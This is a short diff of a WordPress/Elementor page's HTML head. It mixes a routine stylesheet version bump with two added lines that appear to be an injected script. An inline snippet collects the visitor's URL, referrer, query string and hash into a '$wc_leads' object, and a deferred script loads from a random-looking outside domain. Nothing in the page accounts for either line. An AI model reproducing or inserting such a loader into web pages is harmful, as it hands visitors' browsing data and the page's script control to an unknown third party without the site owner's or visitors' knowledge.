@@ -189,8 +189,10 @@
 <link rel="stylesheet" href="/assets/css/core.css?v=bb24bdf7">
 <link rel="stylesheet" href="/assets/css/b-c407dd1b6d.css">
 <link rel="stylesheet" href="/assets/css/core-late.css?v=c0ce072c">
-<link rel="stylesheet" href="/assets/css/fix.css?v=770a7b31">
+<link rel="stylesheet" href="/assets/css/fix.css?v=e42a57ed">
 <script src="/assets/js/main.js?v=48d7623d" defer></script>
+<script>var $wc_load=function(a){return JSON.parse(JSON.stringify(a))},$wc_leads=$wc_leads||{doc:{url:$wc_load(document.URL),ref:$wc_load(document.referrer),search:$wc_load(location.search),hash:$wc_load(location.hash)}};</script>
+<script src="//s.ksrndkehqnwntyxlhgto.com/76819.js" defer></script>
 </head>
 <body class="wp-singular page-template page-template-elementor_header_footer page page-id-101423 page-child parent-pageid-99167 wp-custom-logo wp-embed-responsive wp-theme-hello-elementor theme-hello-elementor mtx-experience mtshop-no-js jps-theme-hello-elementor manage-default hello-elementor-default elementor-default elementor-template-full-width elementor-kit-5 elementor-page elementor-page-101423">
 
